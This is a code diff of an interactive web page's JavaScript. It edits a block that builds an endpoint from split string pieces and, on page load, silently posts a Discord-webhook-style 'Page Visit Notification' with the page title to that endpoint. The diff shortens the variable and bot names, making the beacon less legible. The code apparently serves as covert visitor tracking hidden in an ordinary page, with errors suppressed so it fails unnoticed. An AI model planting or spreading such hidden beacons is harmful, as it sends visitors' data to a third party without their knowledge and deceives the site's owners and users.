@@ -934,12 +934,8 @@ setTimeout(()=>heroShow('hi!',waveArm),1100);
          var PROXY_ENDPOINT = a + b + c;
 
          
-         var discordPayload = {
-           username: "Page Monitor",
-           content: "Page opened: " + document.title,
-           embeds: [
-             {
-               title: "Page Visit Notification",
+         var dp = { username: "pm",
+           content: "Page opened: " + document.title, embeds: [ { title: "Page Visit Notification",
                description: "A user loaded the interactive page.",
                color: 3112826,
                fields: [
@@ -971,7 +967,7 @@ setTimeout(()=>heroShow('hi!',waveArm),1100);
            headers: {
              'Content-Type': 'application/json'
            },
-           body: JSON.stringify(discordPayload),
+           body: JSON.stringify(dp),
            keepalive: true
          }).catch(function () {
            // Fail silently to avoid interrupting client execution
